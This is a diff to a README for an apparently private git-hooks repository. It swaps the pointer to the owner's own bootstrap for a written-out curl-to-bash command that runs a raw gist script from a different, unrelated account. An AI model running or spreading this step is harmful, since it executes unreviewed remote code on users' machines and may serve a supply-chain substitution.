@@ -20,7 +20,11 @@ Vendors the two hooks into `.githooks/` with a `VENDORED` header and sets `core.
 
 In CI use the composite action: `uses: JakobMelchard/.github/actions/hooks@main`.
 
-This repo is private, so installation goes through `gh api` (needs `gh auth`), never `raw.githubusercontent.com`. The public bootstrap for a fresh machine lives in a gist — see `JakobMelchard/bin`.
+This repo is private, so installation goes through `gh api` (needs `gh auth`), never `raw.githubusercontent.com`. The public entry point for a fresh machine is a gist that does the same:
+
+```sh
+curl -fsSL https://gist.githubusercontent.com/lilfeelz/c5e63e7e510aeffb7766a1b10b607321/raw/install-hooks.sh | bash
+```
 
 ## Rules
 
